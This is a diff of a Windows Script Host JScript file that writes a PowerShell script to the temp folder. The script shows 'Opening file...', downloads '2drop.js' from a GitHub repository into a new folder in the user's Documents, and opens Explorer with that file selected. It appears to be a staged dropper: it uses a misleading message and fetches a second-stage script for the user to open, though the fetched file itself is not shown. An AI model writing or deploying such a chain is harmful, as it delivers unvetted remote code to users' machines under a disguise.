@@ -15,25 +15,20 @@ var psPath = tempFolder + "\\" + psFilename;
 // NOTE: the script will create a unique empty folder inside the user's Documents and put 2drop.js there.
 var psContent =
 'Write-Output "Opening file...";\n' +
-'Try {\n' +
+'# Create a unique folder inside Documents and download the file there\n' +
+'$docs = [Environment]::GetFolderPath("MyDocuments");\n' +
+'$folderName = "download_2drop_" + (Get-Date -Format "yyyyMMdd_HHmmss");\n' +
+'$targetDir = Join-Path -Path $docs -ChildPath $folderName;\n' +
+'New-Item -ItemType Directory -Path $targetDir -Force | Out-Null;\n' +
 '\n' +
-'    # Create a unique folder inside Documents and download the file there\n' +
-'    $docs = [Environment]::GetFolderPath("MyDocuments");\n' +
-'    $folderName = "download_2drop_" + (Get-Date -Format "yyyyMMdd_HHmmss");\n' +
-'    $targetDir = Join-Path -Path $docs -ChildPath $folderName;\n' +
-'    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null;\n' +
+'$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/2drop.js";\n' +
+'$destination = Join-Path -Path $targetDir -ChildPath "2drop.js";\n' +
+'Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing;\n' +
 '\n' +
-'    $url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/2drop.js";\n' +
-'    $destination = Join-Path -Path $targetDir -ChildPath "2drop.js";\n' +
-'    Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing;\n' +
-'\n' +
-'    # Open File Explorer and highlight the downloaded file\n' +
-'    Start-Process explorer.exe "/select,`\"$destination`\"";\n' +
-'    Write-Output ("Downloaded to: " + $destination);\n' +
-'    Write-Output ("Opened folder: " + $targetDir);\n' +
-'} Catch {\n' +
-'    Write-Error $_.Exception.Message;\n' +
-'}\n' +
+'# Open File Explorer and highlight the downloaded file\n' +
+'Start-Process explorer.exe "/select,`\"$destination`\"";\n' +
+'Write-Output ("Downloaded to: " + $destination);\n' +
+'Write-Output ("Opened folder: " + $targetDir);\n' +
 'Write-Output "Script complete. -NoExit kept the window open.";\n';
 
 // Write the PS script to temp
@@ -58,6 +53,7 @@ try {
 }
 
 WScript.Quit(0);
+
 
 
 
